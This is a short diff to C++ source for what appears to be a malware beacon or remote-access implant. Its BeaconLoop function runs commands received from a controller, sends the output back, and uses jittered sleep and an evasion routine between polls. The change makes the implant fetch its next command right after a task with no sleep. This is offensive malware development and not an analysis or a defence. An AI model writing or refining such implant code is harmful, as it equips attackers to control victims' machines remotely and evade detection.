@@ -765,13 +765,14 @@ DWORD BeaconLoop(const Session& session) {
                 }
                 DebugLog(L"Exec: " + task);
                 std::wstring result = ExecuteCommand(task);
-                // Trim oversized output
                 if (result.size() > config::CMD_OUTPUT_MAX / sizeof(wchar_t))
                     result.resize(config::CMD_OUTPUT_MAX / sizeof(wchar_t));
                 SendResult(session.sessionId, result);
+                // Re-beacon immediately after a task — no sleep, pick up next command fast
+                continue;
             }
 
-            // Release wake lock during sleep — reacquired by ReapplyEvasion next tick
+            // Idle — release wake lock and sleep until next poll
             ReleaseWakeLock();
             JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
 
